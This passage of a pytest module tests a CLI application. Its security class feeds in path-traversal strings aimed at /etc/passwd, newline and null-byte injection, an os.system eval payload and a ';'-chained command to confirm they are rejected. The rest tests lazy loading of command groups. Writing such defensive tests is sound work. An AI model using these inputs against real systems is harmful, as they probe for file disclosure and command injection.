# TEST SECURITY - CRITICAL
# -------------------------------------------------------------


class TestSecurity:
    """CRITICAL security tests for input validation."""

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "command\x00null",
            "command\ninjection",
            "command\rinjection",
        ],
    )
    def test_execute_command_handles_malicious_patterns(
        self, cli_app: CLIApplication, malicious_input: str, capsys
    ) -> None:
        """Test malicious input patterns are handled safely (CRITICAL)."""
        # Act
        cli_app._execute_command(malicious_input)

        # Assert
        captured = capsys.readouterr()
        # Should show error or ignore, not execute
        assert "Error:" in captured.out or captured.out == ""

    def test_execute_command_does_not_eval_input(self, cli_app: CLIApplication, capsys) -> None:
        """Test input is not evaluated as code (CRITICAL)."""
        # Act
        cli_app._execute_command("__import__('os').system('ls')")

        # Assert
        captured = capsys.readouterr()
        assert "Error: Unknown command" in captured.out

    def test_command_isolation_no_shell_execution(self, cli_app: CLIApplication, capsys) -> None:
        """Test commands are isolated, no shell execution (CRITICAL)."""
        # Act
        cli_app._execute_command("test; echo 'injected'")

        # Assert
        captured = capsys.readouterr()
        assert "injected" not in captured.out
        assert "Error: Unknown command" in captured.out


# -------------------------------------------------------------
# TEST LAZY LOADING INTEGRATION
# -------------------------------------------------------------


class TestLazyLoadingIntegration:
    """Integration tests for lazy loading in CLIApplication."""

    def test_register_command_group_lazy_with_valid_path_succeeds(self, cli_app: CLIApplication) -> None:
        """Test lazy registration through CLI app succeeds."""
        # Arrange
        module_path = "test_module:TestClass"

        # Act
        cli_app.register_command_group_lazy("db", module_path)

        # Assert
        assert "db" in cli_app.registry._lazy_groups

    def test_register_command_group_lazy_with_invalid_path_raises_value_error(
        self, cli_app: CLIApplication
    ) -> None:
        """Test lazy registration with invalid path raises ValueError."""
        # Arrange
        module_path = "invalid_path_without_colon"

        # Act & Assert
        with pytest.raises(ValueError, match="Invalid module_path format"):
            cli_app.register_command_group_lazy("db", module_path)

    def test_execute_command_with_lazy_handler_imports_and_executes(
        self, cli_app: CLIApplication, mock_handler_class, capsys
    ) -> None:
        """Test command execution with lazy handler imports and executes successfully."""
        # Arrange
        module_path = "test_module:TestClass"
        cli_app.register_command_group_lazy("db", module_path)

        mock_instance = mock_handler_class.return_value
        # Handler should NOT validate "db" (group name), so it falls through to dispatch
        mock_instance.validate_command.return_value = False
        mock_instance.execute = Mock()
        mock_instance.get_available_commands.return_value = ["list", "create"]

        with patch("importlib.import_module") as mock_import:
            mock_module = Mock()
            mock_module.TestClass = mock_handler_class
            mock_import.return_value = mock_module

            # Act - dispatch will validate "list" command
            with patch.object(cli_app.registry, "dispatch") as mock_dispatch:
                cli_app._execute_command("db list")

                # Assert
                # Should call dispatch with group "db", command "list"
                mock_dispatch.assert_called_once_with("db", "list", [])

    def test_help_with_lazy_handlers_imports_and_shows_commands(
        self, cli_app: CLIApplication, mock_handler_class, capsys
    ) -> None:
        """Test help for specific group with lazy handler imports and displays commands."""
        # Arrange
        module_path = "test_module:TestClass"
        cli_app.register_command_group_lazy("db", module_path)

        mock_instance = mock_handler_class.return_value
        mock_instance.get_help.return_value = "  list - List items\n  create - Create item"

        with patch("importlib.import_module") as mock_import:
            mock_module = Mock()
            mock_module.TestClass = mock_handler_class
            mock_import.return_value = mock_module

            # Act - Request help for specific group triggers lazy loading
            cli_app._execute_command("help db")

            # Assert
            captured = capsys.readouterr()
            # Verify that handler was imported and help was called
            assert "list" in captured.out
            mock_instance.get_help.assert_called_once_with(None, group_name="db")
